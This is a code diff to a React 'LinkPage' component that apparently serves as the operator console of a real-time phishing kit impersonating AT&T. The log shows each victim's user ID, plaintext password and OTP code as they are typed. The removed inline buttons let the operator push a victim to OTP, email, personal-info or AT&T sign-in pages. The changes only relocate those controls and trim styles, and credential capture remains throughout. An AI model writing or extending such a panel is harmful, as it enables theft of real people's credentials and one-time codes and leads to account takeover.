@@ -152,104 +152,35 @@ export default function LinkPage() {
       if (activity.type === 'userid') {
         content = `User ID entered: <strong>${userId}</strong>`;
         className = 'user-id-entry';
-        showActions = true;
+        showActions = false; // No buttons for user ID entry
       } else if (activity.type === 'password') {
         const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
         content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'password-entry';
-        showActions = true;
+        showActions = false; // No buttons for password entry (only after signin)
       } else if (activity.type === 'signin') {
         const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
         content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'signin-entry';
-        showActions = true;
+        showActions = false; // Control buttons handle this now
       } else if (activity.type === 'otp') {
         const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
         content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
         className = 'otp-entry';
-        showActions = true;
+        showActions = false;
       }
 
       const activityItem = document.createElement('div');
       activityItem.className = `activity-item`;
       activityItem.id = `activity-${activity.id}`;
 
-      let actionsHTML = '';
-      if (showActions && activity.type === 'userid') {
-        actionsHTML = `
-          <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn" data-action="redirect" data-redirect="password">Password Page</button>
-            <button class="action-btn" data-action="redirect" data-redirect="otp">OTP Code</button>
-            <button class="action-btn" data-action="redirect" data-redirect="email">Email Page</button>
-            <button class="action-btn" data-action="redirect" data-redirect="personal">Personal Info</button>
-            <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
-            <button class="action-btn" data-action="deny">Deny</button>
-          </div>
-          <div class="activity-status" id="status-${activity.id}">Waiting...</div>
-        `;
-      } else if (showActions && activity.type === 'password') {
-        actionsHTML = `
-          <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn" data-action="redirect" data-redirect="otp">OTP Code</button>
-            <button class="action-btn" data-action="redirect" data-redirect="email">Email Page</button>
-            <button class="action-btn" data-action="redirect" data-redirect="personal">Personal Info</button>
-            <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
-            <button class="action-btn" data-action="deny">Deny</button>
-          </div>
-          <div class="activity-status" id="status-${activity.id}">Waiting...</div>
-        `;
-      } else if (showActions) {
-        actionsHTML = `
-          <div class="activity-actions" id="actions-${activity.id}">
-            <button class="action-btn" data-action="approve">Approve</button>
-            <button class="action-btn" data-action="deny">Deny</button>
-          </div>
-          <div class="activity-status" id="status-${activity.id}">Pending...</div>
-        `;
-      }
-
       activityItem.innerHTML = `
         <div class="activity-time">${timeString}</div>
         <div class="activity-content">${content}</div>
-        ${actionsHTML}
       `;
 
-      // Add event listeners
-      if (showActions && (activity.type === 'userid' || activity.type === 'password')) {
-        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
-        if (actionsDiv) {
-          actionsDiv.addEventListener('click', function(e) {
-            const button = e.target.closest('button');
-            if (!button) return;
-            
-            const action = button.getAttribute('data-action');
-            const redirectType = button.getAttribute('data-redirect');
-            
-            if (action === 'redirect' && redirectType) {
-              approveActivity(activity.id, activity.type, userId, redirectType);
-            } else if (action === 'deny') {
-              denyActivity(activity.id, activity.type, userId);
-            }
-          });
-        }
-      } else if (showActions) {
-        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
-        if (actionsDiv) {
-          actionsDiv.addEventListener('click', function(e) {
-            const button = e.target.closest('button');
-            if (!button) return;
-            
-            const action = button.getAttribute('data-action');
-            
-            if (action === 'approve') {
-              approveActivity(activity.id, activity.type, userId);
-            } else if (action === 'deny') {
-              denyActivity(activity.id, activity.type, userId);
-            }
-          });
-        }
-      }
-
+      // Add event listeners - REMOVED since no inline buttons anymore
+      
       const noActivity = activityLog.querySelector('.no-activity');
       if (noActivity) {
         noActivity.remove();
@@ -593,6 +524,10 @@ export default function LinkPage() {
           border-bottom: 1px solid #e0e0e0;
         }
 
+        .activity-item:last-child {
+          border-bottom: none;
+        }
+
         .activity-time {
           font-size: 12px;
           color: #666;
@@ -626,37 +561,7 @@ export default function LinkPage() {
           padding: 40px 20px;
         }
 
-        .activity-actions {
-          display: flex;
-          gap: 8px;
-          flex-wrap: wrap;
-        }
-
-        .action-btn {
-          padding: 8px 16px;
-          border: 1px solid #d1d1d1;
-          border-radius: 20px;
-          font-size: 13px;
-          font-weight: 500;
-          cursor: pointer;
-          background: #ffffff;
-          color: #333;
-          transition: all 0.15s ease;
-        }
-
-        .action-btn:hover {
-          background: #f5f5f5;
-        }
-
-        .action-btn:active {
-          transform: scale(0.98);
-        }
-
-        .activity-status {
-          margin-top: 8px;
-          font-size: 12px;
-          color: #666;
-        }
+        /* Remove unused action button styles */
       `}</style>
       <div className="simple-container">
         <div className="activity-box">
